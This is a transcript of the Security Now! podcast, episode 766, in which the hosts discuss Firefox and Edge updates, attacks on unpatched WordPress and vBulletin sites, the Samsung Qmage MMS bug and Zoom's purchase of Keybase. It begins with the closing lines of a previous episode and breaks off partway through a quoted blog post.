I think that's all I have to tell you.  Oh, subscribe.  That's the one other thing I want to say.  If you haven't subscribed, that's the best way to get it because then you'll get every episode the minute it's available, and you can listen to it at your leisure.



Steve, thank you.  Have a great week.  Stay healthy.  Stay safe.



STEVE:  My friend, next week we will continue our 12-and-a-half-year trek through the security wilderness.  



LEO:  Holy moly.  Thank you, Steve.  We'll see you next time.



STEVE:  Okay, buddy.  Bye.



Copyright (c) 2020 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.




GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#766

DATE:		May 12, 2020

TITLE:		Thunderspy

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-766.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week we examine Firefox's recent move to 76 and slightly beyond; a wonderful new feature coming to Edge; and the security responsibility that attends the use of WordPress, vBulletin, and other complex and sophisticated web applications. We look at the plans for this summer's much-anticipated Black Hat and DEF CON conferences, a newly revealed CRITICAL bug affecting all of the past six years of Samsung Smartphones, and Zoom's latest security-boosting acquisition.  I'll then provide an update on my SpinRite work which includes a bit of a rearrangement in sequence to provide another shorter term deliverable.  And then we look at the new Thunderspy vulnerability that has the tech press huffing and puffing.



SHOW TEASE:  It's time for Security Now!.  Steve Gibson is here.  Coming up, Firefox adds a new password manager, WordPress once again in the crosshairs, Zoom acquires Keybase, and a look at Thunderspy, a new Thunderbolt vulnerability that everyone's subject to.  It's all coming up next on Security Now!.



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 766, recorded Tuesday, May 12th, 2020:  Thunderspy.



It's time for Security Now!, the show where we protect you and your loved ones, your privacy, your security.  We even teach you a little bit about technology as we talk.  That's because of this guy here, the best teacher ever.  He's like the teacher you had in 10th grade you'll never forget, taught you everything you ever wanted to know about electronics:  Mr. Steve Gibson.  Hi, Steve.



STEVE GIBSON:  Yeah, mine, his name was Harold Fearon.  He was my high school electronics teacher.  And he did make my...



LEO:  You don't ever forget them, do you.



STEVE:  No.  Quite an impression.  Everybody hated him except I liked him.  He was ruthless and rigorous and...



LEO:  Perfect.



STEVE:  But if you played by the rules, it was all good.



LEO:  It's like Mr. Devore, my chemistry teacher.  I loved him.  Got an A in chemistry because of him.  You're right.  You never forget those guys.



STEVE:  Yeah.



LEO:  So, hello, Steve.



STEVE:  So we're going to talk about Thunderspy, which is the name given to the result of an analysis by a security researcher into the dilemma essentially that we currently have, which is that PC designers seem incapable of not routing the system's internal bus to the outside.  Which is just a bad idea.  But that's what we have.  Anyway, lots to talk about.  We're going to examine Firefox's recent move to its release 76 and slightly beyond; a wonderful new feature coming to Edge; the security responsibility that attends the use of WordPress, vBulletin, and other complex and sophisticated web applications, with examples from this past week.



We look at the plans for this summer's much anticipated Black Hat and DEF CON conferences, a newly revealed critical bug affecting all of the past six years of Samsung's smartphones, and the need to patch if you think you might be a target of opportunity.  And unfortunately - I know you're already mourning this, Leo - Zoom's latest security-boosting acquisition.



LEO:  Yeah.  Bad for me, but probably very good for Zoom, I'm guessing.



STEVE:  Yes, it was brilliant because from a PR standpoint you couldn't get a better - right now they need headlines more than they need actual technology, so they bought themselves some headlines.  I'll then provide an update on my SpinRite work. 



LEO:  Oh, good.



STEVE:  Which includes, as a result of what I've learned since I've been back to it, a bit of a rearrangement in sequence to provide an additional short-term deliverable.  And then we're going to look at this new Thunderspy vulnerability suite that has the tech press all huffing and puffing.  So I think another great podcast.  Oh, and Leo, we've got a Picture of the Week for the ages.



LEO:  I just saw it.  I'm laughing.  I am laughing and laughing and laughing.  Good.  So, Steve Gibson.



STEVE:  So our Picture of the Week...



LEO:  Oh, my god, that's hysterical.



STEVE:  It was tweeted to me.  I checked into Twitter as I often do when I'm looking for something, to see if someone has said, "Hey, Steve, how's this as a candidate?"  And I love it because it had to have been a setup, I presume.  But still, it's no less funny.  Of course we're all familiar with the old-school practice of hiding a key under the mat.  I mean, that's like a meme of the world, hiding a key under the mat.



LEO:  I know, and I do it.  I wonder if I'm giving away a secret to say that, but that's where we put the key.



STEVE:  Well, and if it's not there, then you of course look under the pot because then, if there's a pot on the porch, it's going to be underneath the pot.  It makes the pot rock a little bit, but that's a giveaway.  Anyway, this particular mat has a problem which is it's more non-mat than - or maybe about 50-50 - non-mat than mat.  It's a grid of holes connected with some rubber.  And the key is showing right through the holes.  And for that matter I guess the person's shadow, come to think of it, is also quite apparent as the photo is being taken.  Anyway, just as a...



LEO:  That's hysterical.



STEVE:  ...little item of Security Now! interest, I think that's pretty good.



LEO:  "The key's under the mat."  "I know."



STEVE:  Uh-huh.  Don't even have to lift it to find it.  



LEO:  No.



STEVE:  So last week Firefox 76 was released with some new features.  This was on last Tuesday while we were doing the podcast.  And this is for the desktop OSes - Windows, Mac, and Linux.  They fixed a bunch of bugs we'll get to in a second, and added a couple nice new features.  It was around this time last year that Mozilla first began sort of sticking their toe in the water with their own password manager extension called Lockwise.  It's homegrown.  And today, a year later, I mean, we've mentioned it a couple times in passing.  We all know I don't use it.  But there is one from Mozilla.



Of course it's probably Firefox, I'm sure it's Firefox-only because it's implemented as a Firefox extension.  So you don't get the multiplatform, multibrowser benefit of a solution which is cross-browser.  But if you are a Firefox-only person, maybe it works for you.  So presumably it's acquired a following, and it has been continuing to get support and some future growth.



So they've just added a couple nice features, clearly tying it into, probably, I didn't see this explicitly, but I would imagine it's tied into Troy Hunt's Have I Been Pwned database which, as we know, he's made an API available for this kind of purpose.  You will now, if you are a Firefox Lockwise user, you get a notification of a website breach on the Internet that may be affecting you.  A notice is presented saying that passwords were leaked or stolen from this website since you last updated your login details.  Change your password to protect your account.  So a handy feature.



And in a little bit of a variation on that, they have a different approach, a different notice that you can get saying this password has been used on another account that was likely in a data breach.  Again, the password sharing problem.  And they say reusing credentials puts all your accounts at risk.  Change this password.  So anyway, some nice feature additions.  No biggie, but worthwhile.



And in a nice security-tightening measure, before displaying a user's saved login credentials, Lockwise will now fall back to requiring any users who have not previously established a master password for Lockwise to reenter their local computer's login account password.  So that seems like a good thing.  This will prevent anyone who might obtain access to your logged-in computer session from snooping into your stored username and passwords.  I have freaked out several users of Chrome by showing them - and they're all, yeah, well, this is really a secure browser.  I show them how easy it is to have Chrome unmask all of the passwords they have asked their Chrome browser to save for them.  Virtually no one appreciates that the entire list of saved usernames and passwords is displayable after a few clicks.



LEO:  And that's true in Chrome, too.  That's why we've always said don't use a browser to keep your passwords.



STEVE:  Yes, yes, yes, exactly.  We also previously touched on a planned feature in Firefox which dropped in this version.  We said that they would be adding a video pop-out feature which allows you to lift a page's playing video off away from the page into a separate floating window.  And that feature went live last week with Firefox 76.  BleepingComputer noted in their coverage of this that the feature didn't yet appear to be working reliably.  I think rather than just talking about it, they actually tried to use it, and some pages would only allow one to pop out, then nothing else could be popped out.  Or like it only happened once per browser session.  I mean, it was like not ready yet.  So I imagine that it'll be getting some more, becoming more solid in the future with additional iterations.



I mentioned some security vulnerabilities.  They fixed 11 CVE-numbered vulnerabilities, three of which were rated critical.  There was a use-after-free during worker shutdown.  And as we all know, any allowance of the use of freed memory is never good.  So Mozilla notes that this results in a "potentially exploitable" crash.  They don't know that it could be.  It's not in the wild so it's not a zero-day.  But good to have that fixed.



There's also a sandbox escape with improperly guarded access tokens.  And of course since a sandbox escape means that a web page's rogue content, if there were any, might be able to  escape its confinement and interfere either with other pages or with the host operating system, that's not good either.  So that's gone.  And then there's a sort of a catchall.  They just said "memory safety bugs," plural, fixed in Firefox 76 and their extended service release 68.8.  So they're not specifying what they were, but we know that there were eight different subtle memory bugs that were found and smashed.  So good for that.



On the other hand, shortly after it first appeared, Mozilla encountered, or I should say their users encountered, a pair of newly introduced bugs that it could not ignore, Mozilla could not ignore.  One caused the Amazon Assistant browser extension to no longer function correctly, and the other fixed an obscure browser crash in Windows 7 32-bit systems with Nvidia graphics.  Go figure.  Anyway, they paused 76's ongoing rollout as soon as those things appeared because they thought, okay, well, we can't keep doing this.  They fixed those.



And then last Friday, three days after the release, 76.0.1 became available now to all Firefox users.  And since I run with an instance of Firefox open permanently and maximized in my lower left-hand screen, none of those updates were happening here.  So when I read about this in preparation for the podcast, I went over to About Firefox and was immediately asked for permission to restart Firefox, which I did, of course.  And now I have 76.0.1.  So these are not critical.  They're not zero-day.  As far as we know they're not exploited in the wild.  I didn't dig into how they learned of them.  But if you are like me, and your Firefox just sits there happily open all the time, and also like me you never typically reboot your system, I mean, mine goes for, well, almost years at a time since it's pretty stable.  You just may want to go over there and have Firefox fix itself because that's good.



So I was very excited about this when I first read about it because I thought it was unique.  [Buzzer sound].  But still, it's good to have it.  Edge is adding a feature to silence those annoying notification requests.  When I'm in research mode, as I have been recently when I'm doing fact-finding on the 'Net for ideas about the best ways to accomplish some programming tasks that I haven't yet encountered before, I tend to roam around, maybe straying more than I usually do from my very boring beaten path.



So the other day I encountered a site that - I love this.  I just shook my head.  It explained that in order to enable whatever it was that I wanted to do, and I don't really remember what that was, probably download something or maybe click a link and look at some information, I needed to "enable downloads" or "enable compatibility" or some nonsense by clicking the Allow button on the notifications dropdown.  And sure enough, there it was, that dropdown that we're seeing now with increasing regularity, hanging down below the URL, asking for me to either allow or block any and all of that website's future push notifications.



We've talked about this annoyance before.  It is unfortunately new, relatively new, and extremely abuse prone.  It allows websites to which you have given permission to, from then on, interact with your operating system, linking into your OS's native notification system to bother you anytime the site wishes to.  Now, just tell me that is not subject to abuse.  You know, some ideas, this and like now always needing to get our permission to use cookies, are just very bad.  This whole background website notification system is another bad idea.



So blessedly, Edge is getting a feature, and what I wrote here in the show notes is that I sure hope the two browsers I actually use, Firefox and Chrome, will immediately adopt.  Under Site Permissions/Notifications on Edge is "Quiet Notification Requests," and it describes itself as "This will prevent notification requests from interrupting you."  And with Quiet Notification Requests enabled, this whole annoying permission dropdown is replaced in Edge by a small and easy-to-ignore bell icon which appears at the far right-hand side of the URL address bar.



And if for some reason you should want to see the notification, for example, if you're being held ransom over accepting notifications before the site will do what you want, you can click the bell to manage notifications - that's one of the options - or allow them for the site.  And Edge also provides a very clean Manage facility that would allow you to easily revoke any notification permissions you may have come to regret.



The moral of this story is that sometimes you need to go looking for what you want.  After writing this, I became curious about Chrome and Firefox.  And I'm glad I did because both of those browsers already offer the functional equivalent of this feature.  You've just got to go find it and turn it on.  It's now enabled on both of the browsers I use daily.  Open either browser's Settings and use the page's search function to search for notifications, and you'll be taken to that function in the UI.  Works great.



LEO:  First thing I do on both Chrome and Firefox is turn off - and this blocks, it's actually better, or maybe worse, depending on what you want from notifications.  I just turn it on.  I never see any requests for notifications, so I never have to worry about it one way or the other.  And it will give you a list of ones you've already said yes to in case you want to just delete all of those, as well.



STEVE:  Yeah, yeah.  Both browsers have good management, and they both completely mute any requests.  Now, the problem we're going to run into, those of us who have done this, is that there are an increasing number of sites, I hit one myself, I was reading about one in this coverage, that in typical slimy site mode where taking advantage of users who don't know better, the website code is able to detect whether you have notifications enabled for it or not.  And so the new annoying site behavior is to require you to enable notifications in order to proceed.



LEO:  Bye-bye.  I'm never going back to that site.



STEVE:  Exactly.



LEO:  I mean, you'd have to really want that site.



STEVE:  You've got to be desperate for whatever it is, yes.



LEO:  As soon as a site did that I'd say, yeah, I don't think so, sorry, yeah.



STEVE:  Exactly.



LEO:  Wow.  That's really screwy that a site would do that.  Oh, you have to have notifications.



STEVE:  Does it surprise?



LEO:  No, it doesn't surprise me at all.



STEVE:  No, and it doesn't say that.  It says, you know, you must allow full compatibility or some BS.



LEO:  Yeah, yeah, yeah, some line.



STEVE:  And so the user goes, oh, and looks up there, and hits Allow because...



LEO:  Just break the web more.  Go ahead.



STEVE:  It's the equivalent of you must download, you must update your Flash Player, that sort of thing.  We're never going to get away from this.



LEO:  At least the Edge thing is nice because you could turn it on, but it would quiet it when you wanted to; right?  You'd have a little more flexibility than just say I don't want notifications ever.



STEVE:  Correct.  Correct.  So yeah, I would turn on "Don't bother me."  If you come to a site - because it's going to say it in the middle of the page, you must turn on notifications.  Look up there and click Allow.  Well, those of us who have muted all the notifications, there's a way, at least in Edge, of selectively saying "Show me the notification."  So you could then turn it on, get past this block, and then just go back into the browser's management.



LEO:  No notifications, yeah.



STEVE:  And remove it.  So, yeah.



LEO:  That's good.



STEVE:  The fight goes on.  Now, if we could just get, Leo, a uniform API for all those incessant "This site uses cookies, okay?" permission banners.  Mine would be set to "Curmudgeon," which is short for "Yes, yes, yes, cookies, I get it, now don't ever ask me again."



LEO:  Well, and this is an example of overregulation, or an unintended consequence of regulation because this comes from GDPR and European regulation.  You've got to notify them if you're going to keep cookies.  And now every site in the world, and I wonder how many millions of human hours are wasted clicking okay, okay, okay, okay every time.



STEVE:  It's so wrong.



LEO:  Okay.  Yeah, there's nothing we can do about that, yup.



STEVE:  Okay.  We've got WordPress in the crosshairs.  WordPress, of course, needs no introduction.  It's in use by more than 60 million websites, including more than a third of the top 10 million websites as of this time last year is the latest statistics I could see.  As we know, it's a complex system written in PHP which supports third-party add-ons.



LEO:  As we know, those three things together mean disaster.



STEVE:  Exactly.  Exactly.  The terms "complex" and "third-party plugins"...



LEO:  And PHP.



STEVE:  ...are both fundamentally antithetical to security.



LEO:  Yeah.



STEVE:  So starting near the end of last month, and increasing since, the company Defiant, which are the publishers of the Wordfence security plug-in, from their privileged position in a whole bunch of WordPress sites, they detected somebody running a botnet or a proxy system who began attacking WordPress sites from at least 24,000 separate IP addresses.  So it's got to be proxies or a net of bots or something because the IPs were coming in from all over the place.  This represented a thirtyfold increase in attack traffic.



For example, just on one day, which was this Sunday before last, May 3rd, Defiant logged more than 20 million attacks against more than half a million websites.  They said that the attackers focused mostly on exploiting cross-site scripting (XSS) vulnerabilities and plugins that had already received fixes months or even years ago and had previously been targeted in other attacks.  Which suggests, if this was a worthwhile attack, that these sites are just not being fixed.  There were five that were most targeted, which they identified, again because they were in a position.  They're like a WordPress firewall.



There was a cross-site scripting vulnerability in the Easy2Map plugin, which was removed from the WordPress plugin repository last summer, in August of 2019, and they estimate is probably installed on less than 3,000 sites all total.  Yet that accounted for more than half of all attacks.  These guys were just - maybe they were recycling some old attack code, or they had it handy, or why not try this one, maybe we'll get lucky.



There was a cross-site vulnerability, cross-site scripting vulnerability in Blog Designer, patched last year.  They estimate that no more than 1,000 vulnerable installations of that one remain, and it's been the target of previous campaigns.  There was an options update vulnerability in WordPress's GDPR compliance tool, which was patched in late 2018, which would have allowed attackers to change the site's home URL in addition to other options.



Those are some powerful options.  I think we talked about this at the time.  And although this plugin, because it's WordPress's, has more than 100,000 installations, it was fixed two years ago, and they estimate now that today no more than 5,000 sites remain vulnerable to it.  But still, I guess it's low-hanging fruit, just not a lot of it.  There's also an options update vulnerability in something called Total Donations which would allow attackers to change the site's home URL, again an options update vulnerability.  This was removed permanently from the Envato Marketplace that sells lots of add-on PHP apps, early last year.  They estimate that less than a thousand total installations remain.  But still, if you've got it, and you didn't update it, you could be a victim of it.



And, finally, there's a cross-site scripting vulnerability in the WordPress Newspaper theme, which was patched four years ago, in 2016.  And it's also been targeted before, and now.  So of course the takeaway here is obvious to all of us.  Admins of WordPress sites must be responsible about updating their plugins and removing those that are no longer present in the WordPress repository.  There's a reason they were yanked from that repository.



And if this hasn't gotten the attention of all WordPress admins yet, there's also a critical WordPress plugin, two plugins, present on over one million sites.  Wordfence's threat intelligence team also reported last week that they detected a new campaign attempting to abuse two other bugs in WordPress in ongoing attacks.  The attacks are attempting to exploit security vulnerabilities in two things:  Elementor Pro and something called Ultimate Addons for Elementor.  The flaws potentially allow remote code execution of arbitrary code and a full compromise of unpatched targets.



On the 6th of May, which was what, last Wednesday, they wrote:  "Our Threat Intelligence team received reports of active exploitation of vulnerabilities in two related plugins, Elementor Pro and Ultimate Addons for Elementor.  We have reviewed the log files of compromised sites to confirm this activity."  Remember, a million sites are using this thing.  "As this is an active attack, we wanted to alert you so that you can take steps to protect your site.  We are intentionally limiting the amount of information this post provides because this is an ongoing attack, and the most critical vulnerability has not yet been patched.  There are two plugins" - oh, and they notified the Elementor people, didn't get a reply.  "There are two plugins affected by this attack campaign."



They said:  "The first is Elementor Pro, which is made by Elementor.  This plugin has a zero-day vulnerability which is exploitable if users have open registration."  So this is apparently involved in the registration loop of a site.  And if your site allows people to register, and you're using Elementor Pro, whatever that does, that's not good.  Then they updated this the next day, on May 7th, to say that:  "Elementor has released version 2.9.4 of Elementor Pro.  Our threat intelligence team has verified that this patches the vulnerability.  We recommend updating to this version immediately."  And of course we'll talk in a second about why that may not be enough.



"The second affected plugin," they write, "is Ultimate Addons for Elementor, which is made by Brainstorm Force.  A vulnerability in this plugin allows the previous vulnerability, the Elementor Pro vulnerability, to be exploited, even if the site does not have user registration enabled."  So if you were using Elementor Pro, weren't an open registration site, but you also had the Ultimate Addons for Elementor, the vulnerability in that one would allow you to bypass the closed registration on your site in order to get to the Elementor Pro vulnerability if you haven't yet patched it.  They said:  "We estimate that Elementor Pro is installed on over one million sites, and that Ultimate Addons has an install base of around 110,000."  So these are big attack targets.



So they said:  "To be clear, this does not impact the free Elementor plugin."  Anyway, it goes on about critical severity.  It's a remote code execution, full-site takeover, writing code, really ruining your month or more, and so on.  At the time, prior to the update, they were recommending that, because Elementor Pro had not been yet patched, that people who needed it back down to the free version that was not vulnerable, use that until it's patched, then go back up to the Pro which you've presumably purchased.  So anyway, if any of that rings a bell, make sure that you've got yourself patched because the 60 million WordPress sites, that's one out of every 60 WordPress sites was using this thing that was found being exploited when it came to their attention.



And of course the takeaway from all of this is somewhat more encompassing.  Our software, all of our software, is becoming increasingly complex.  And the development style which we can see from this podcast, which has evolved, is powerful because it's so modular.  Third-party code libraries are obtained and integrated at the code level.  Third-party plugins are obtained and integrated at the operational level.  And in some cases, that resulting endpoint solution is further enhanced by an automation layer above that which pushes its buttons.



So the result is a massive, complex, and understandable only from a distance in overview system about which no true assertion of knowable security can be made because the system itself at the level of detail required to make any such assertion is unknowable, or at least unknown.  And even if every modular component were itself secure, which history teaches us is never effectively true, each module makes assumptions about the nature of its input and output.  And those assumptions may not have been fully understood and appreciated by the developers who plugged all of the pieces together.  As a result, the system will almost certainly be able to exhibit unexpected behavior when those assumptions are deliberately violated by attackers.



So what we've created with this ad hoc assemblage of disparate components is inherently insecure.  But it's a choice we've made in the name of expediency.  And, I mean, it's a huge gain.  I mean, the power factor gain is not something I'm suggesting we can give up at this point.  Because it is so seductively expedient.  We obtain almost magical results when big systems like this are glued together.  But what we don't get is robust security.  It's just not available from this approach.



So we're left with doing the best we can.  And that means monitoring and patching.  And responsible patching requires knowing when there are patches.  And knowing when there are patches requires maintaining a multitude of open lines of communication to the maintainers of every piece of this massive puzzle and then responding rationally with due speed when any significant new problem arises.  So maintenance is the price we pay for expediency.  And what we see is that all too often that price is not paid.



So anyway, there were just so many of these sorts of things we're seeing.  I mean, hopefully no one listening to this podcast was among the one in 60 WordPress websites that were vulnerable, or they got the notification from Elementor Pro or of the Elementor Pro problem from Elementor and jumped on it fast before their site could be exploited.  No one wants people to get hurt.  People are being hurt. 



LEO:  I use WordPress.com.  And I presume, you know, they vet the plugins that you can use, and I presume they also keep them safe and up to date.  But that's a good question.  I'll have to check.  Because they really host it.  It's a host-managed system.



STEVE:  I also have a WordPress blog.



LEO:  Do you self-host, or do you do the WordPress.com managed hosting?



STEVE:  I self-host, although I'm linked in through Jetpack, which is their add-on.



LEO:  Right.



STEVE:  And it provides a lot of the same features.



LEO:  Jetpack's great, yeah.



STEVE:  Yeah.  So it's sort of the compromise.  It gives me Akismet in order to do spam blocking.  And, boy, it blocks all kinds of junk.  It also notifies me of updates.  Sometimes it will notify me that it autonomously updated my WordPress installation.  I've given it permission to do so.  I'd rather that than to be exploited.  I guess I'm of the opinion that the best solution is to be very sparse with the add-ons you use.  And this is like how we feel about apps on our phone; right?  If you just click, ooh, look at this candy store of free stuff, and you just load your device down with stuff, every one you add, the individual opportunity for a problem might be small.  But when you keep adding them, the effective opportunity increases.



So I have some mailing agent and maybe only - I have a very small number of additions.  And I think actually most of them are from WordPress themselves, to add a couple features.  I have like a Twitter feed thing and that kind of stuff.  But very little.



LEO:  Yeah, the less, the better.  Especially with these - a lot of them are, I mean, that Elementor I think might be a little janky.  You know what I'm saying?



STEVE:  They've made it onto a million sites, whatever it is.



LEO:  Well, that's true.  But that doesn't, you know, I mean, there's a lot of sites out there.



STEVE:  Yeah, true.  Okay.  So against that somewhat dispiriting background, we've got another example of a web-based security emergency:  vBulletin.



LEO:  Another great safe PHP project.



STEVE:  Exactly.  It's widely used Internet forum software which currently powers more than 100,000 websites around the world.  Written in PHP with a SQL backend, it's in use by many of the Fortune 500 and other major companies.  It has the mixed blessing of being old, and old is not always good.  Several of that system's early developers had a falling out with management and left vBulletin to form XenForo, which our listeners all know...



LEO:  Is what you use, yeah, yeah.



STEVE:  ...is what I chose.  They had the opportunity, and for something like this I recommend it, of just starting over from scratch.  Use everything you learned during the first implementation.  I think this is actually their fourth overall.  And just say, okay, now we think we know how to do it.  You'll find out you don't, you know, and that you kind of have to fudge the details and things.  But that's the nature of it.  And then maybe the next time you'll know how to do it.



vBulletin remains a very active going concern, and the maintainers of vBulletin just announced a CRITICAL patch, in all caps, without revealing any information, not that that helps a lot, or details about the underlying security vulnerability.  It's only identified by its CVE tracking designator of 2020-12720.  But the word on the street is that anyone running vBulletin must update immediately to the latest release of their major release track.  Because vBulletin remains quite popular on the web and because being written in PHP it is effectively running its own source code.  So it's one of the hackers' favorite targets.



The maintainers are clearly hoping that withholding the details of the flaw could buy some time for their users to apply the patch before hackers can reverse-engineer the fix and use that to exploit those sites which have not yet updated.  However, as has occurred previously, researchers and hackers both have already started reverse engineering the patch to locate and understand the vulnerability.  The national vulnerability database has analyzed the flaw and revealed that it is indeed CRITICAL, in all caps, and originating from an incorrect access control issue.



vBulletin's bulletin said:  "If you are using a version of vBulletin 5 Connect prior to 5.5.2, it is imperative that you upgrade as soon as possible."  Nothing's been said about whether vBulletin version 3 and version 4 - as I noted, it's been around, I think it was '07.  No, no, '04, I think.  So it's been around for quite a while.  And if they have the problem, that's also really bad since those versions are combined about equal to the number of v5 installations.  In other words, there are people foolishly running version 3 and version 4, for which there has been no maintenance for a long time.  Still out on the Internet, presumably, we'll hope, no major corporations.



And of course, Leo, as I mentioned to our listeners at the time, that's why before I was willing to bring up a PHP-based bulletin board, I put a physical firewall between that separate machine and the rest of my network.  And that firewall only allows a specially designated bit of traffic out to the outside world, and none to the rest of my network because, I mean, this stuff is, as I said, these systems are so cool in what you're able to glue together and do.  But with that expediency comes a price.



So this is an unfortunate thing that we see with this sort of software, just as with Microsoft finally refusing to maintain Windows 7, despite its still massive install base, the vendors of complex web forum software occasionally produce a major upgrade that requires effort on the part of all their sites to make the change.  I've already done that once with the XenForo forums that I maintain.  I had to take it all down, back it all up, do a major update, have the database format converted and all that.  I mean, it's easier just to say, eh.  But you just can't.  Maintaining that kind of software comes with a responsibility.  So it's truly a mess.



And last September, we talked about this at the time, something very similar to this occurred with vBulletin when a remote code execution vulnerability was discovered and patched, and sites were urged to upgrade immediately.  Many didn't, and many were successfully attacked because the attackers wasted zero time in pouncing.  This is why users of these systems, admins must be able to dedicate the time of someone who is just as committed to patching the systems as the attackers are to attacking it.  It's just not something you can take for granted.  Currently there's no proof of concept code available, and no indication that the new vulnerability is being exploited in the wild.  But if history is any guide, we may be talking about that next week.



The clock is ticking because Charles Fol, a security engineer at  Ambionics, who was the confirmed discoverer of the vulnerability, who also responsibly reported it to the vBulletin team so they could create their updates, has stated that he plans to release more information during the upcoming French SSTIC security conference scheduled for the 3rd through the 5th of June, thus early next month, about three weeks from tomorrow.  And so anyone running vBulletin, you want to download and install the patch for your version.  5.6.1 needs to patch to level one.  5.6.0 same, and 5.5.6.



So this thing's been diverging a little bit.  There's three different patches you need to apply, depending on which one you're using.  And notice, no hope for version 3 and version 4 people, even though I don't know that they're affected by this.  Hopefully they're not.  I mean, maybe they're just stable, and they're happy with what they've got.



And Leo, for the first time ever, for the first time ever, I might actually considered attending this summer's Black Hat and DEF CON security conferences.



LEO:  Oh, Steve.  Hadn't you heard?



STEVE:  And in fact I would encourage all of our listeners to do so.  They've been confirmed now to be going online.



LEO:  This is great, actually.



STEVE:  Yeah.



LEO:  All of these conferences, suddenly you can attend.  It's great.



STEVE:  Well, and you don't have to leave your tech at home or lock it up in an RFID-proof enclosure.



LEO:  Yeah, yeah, it's safe.  Right.



STEVE:  The two conferences, well, as we know, they are the industry's two biggest cybersecurity conferences annually.  But of course for the first time ever they will not be held in Las Vegas.  Thanks to the coronavirus, they'll be going virtual.  The two conferences were initially scheduled to take place in Vegas, as always, sequentially, back to back, during the first two weeks of August.  Black Hat would have been August 1st through 6th, and DEF CON 7th, 8th, and 9th.  But of course they're following in the footsteps of many other cybersecurity conferences and non-cybersecurity conferences, all conferences, that have necessarily switched into the cyber world for the purpose of discussing cybersecurity.  We don't have many details at the moment.



But we do know that both conferences are planned to live stream the talks to their paying attendees.  And normally there are parallel tracks.  And so like they've got multiple talks going on at the same time.  I don't know how they'll handle that.  Maybe they'll just do them that way.  Or maybe they'll make them serial.  They could certainly extend the hours.  Anyway, we'll see what happens.  Since no changes in dates have been announced, both conferences are expected to still take place during their previously announced dates, although all attendees can cancel their airline tickets.  I'm sure that's already happened.



The Black Hat team has only posted a short statement, but Jeff Moss, DEF CON's manager, went into some detail about what led up to his decision to go virtual.  He wrote:  "While I made the decision to cancel the in-person conference a month ago on April 11th, the delay in announcing was been due to learning how to actually cancel," since he'd never had to before.



LEO:  It's more complicated than you think because they prebook the venue and all sorts of stuff; right?



STEVE:  Yes, exactly.  He said:  "It has taken weeks of working with staff, lawyers, accountants, and Caesars Palace."  He says:  "I didn't want to endanger the future of the conference by tweeting that we were canceling before we understood and were confident we could navigate the process."  So going forward, Jeff has said that DEF CON will continue to be an in-person event.  That is, this is not the straw that said, oh, why are we all meeting in person?  And I really get that.  I mean, a huge amount of the charm of Black Hat and DEF CON is being there physically.  So next year DEF CON 29 is still scheduled to be an in-person event, August 5th through 8th of 2021.  But not this year.  This year you get to tune in and do it from the comfort.  And I may attend.  I'm like, why not?



So Samsung has patched a critical bug affecting the past six years of smartphones.  Since 2014 the Android OS flavor running on Samsung devices has included a handler for the custom Qmage, which was a new one for me, Q-M-A-G-E, the Qmage image format that has the extension .qmg.  A researcher with Google's Project Zero discovered a way to exploit how Skia, S-K-I-A, which is Android's graphics library, handles these Qmage images sent to a device.  And this can be exploited as a zero-click attack through the reception of MMS messages without any user interaction.  The vulnerability occurs because Android redirects all images sent to a device through this Skia library for processing, such as generating thumbnail previews.



Google's researcher developed a proof-of-concept demo exploiting the bug against the Samsung messages app, which is included in all Samsung devices and of course is the handler of all incoming SMS and MMS messages.  And outgoing, too.  I mean, that's the messaging app.  The bug was exploited by sending repeated MMS messages to a Samsung device.  Each message attempted to guess the position of the Skia library within the Android phone's memory space, which is required in order to brute force Android's ASLR, the Address Space Layout Randomization protection.



Once the Skia library has been located in memory, a single final MMS message delivers the actual Qmage payload, which executes the attacker's code on a device.  So the attack typically requires between 50 and 300 MMS messages, you know, basically you're guessing where Skia is located in memory, so it's going to be a range until you guess right.  So it typically requires between 50 and 300 messages to probe and bypass ASLR, essentially by brute force.  And that usually takes around 100 minutes on average.  So while the attack might seem noisy, it can be improved to execute without any alert to the user.



The researcher at Google wrote:  "I have found ways to get MMS messages fully processed without triggering a notification sound on Android, so fully stealth attacks might be possible."  The vulnerability was discovered back in February and reported to Samsung, who then patched the bug in this month's May 2020 security updates.  And of course thanks to ASLR, this is a perfect use case for it, the attack is functionally limited to targeted attacks.  Were it not the case, if you could just send out MMS messages and immediately perform a remote device compromise, that'd be really bad.  So it's a good thing we have ASLR here.



Anyway, if you or someone you know are a Samsung smartphone user who might be a target of a targeted attack - again, it's not expected to just be sprayed because you can't spray this one - be certain to obtain this month's Samsung patches.  Hopefully you've got a phone that is still current and patchable, even if this Qmage format was added in 2014.  No other smartphones from other vendors appear to be impacted because only Samsung has modified their version of the Android OS to incorporate this custom Qmage image format which was developed by a South Korean company, Quramsoft.



So anyway, just a note for any Samsung users.  Hopefully you're on the patch cycle, and you got the patch.  And it wasn't found.  It's not a zero-day.  It wasn't known to be exploited in the wild.  So this is just one of those things where Google Project Zero comes to the rescue again, ahead of it being a zero-day.  And Leo.



LEO:  Yes.



STEVE:  Zoom purchased Keybase.



LEO:  I know.  I never did get you to try it, did I, Steve.



STEVE:  No.



LEO:  Too late now.  Well, I guess you could still try it.  They didn't kill it.  But it doesn't look good.



STEVE:  Well, they effectively killed it because they bought the brain trust.



LEO:  Right.



STEVE:  And the reputation, which is what they wanted.  Last Thursday, May 7th, Zoom's CEO Eric Yuan blogged the news of Zoom's latest move for furthering the security of their wildly successful, thanks to the coronavirus, teleconferencing platform.  And in the URL, I got a kick out of the fact that it's got WordPress in it.  It's blog.zoom.us/wordpress/ blah blah blah.



LEO:  And we guess we know where Zoom's blog is.



STEVE:  Exactly.  The title of Eric's posting was, and there are some technical goodies in here, so I'm going to share it with our listeners:  "Zoom Acquires Keybase and Announces Goal of Developing the Most Broadly Used Enterprise End-to-End Encryption Offering."  He says:  "We are proud to announce the acquisition of Keybase, another milestone in Zoom's 90-day plan to further strengthen the security of our video conferencing platforms.  Since its launch in 2014, Keybase's team of exceptional engineers has built a secure messaging and file- sharing service leveraging their deep encryption and security expertise.  We are excited to integrate Keybase's team into the Zoom family to help us build end-to-end encryption that can reach current Zoom scalability.



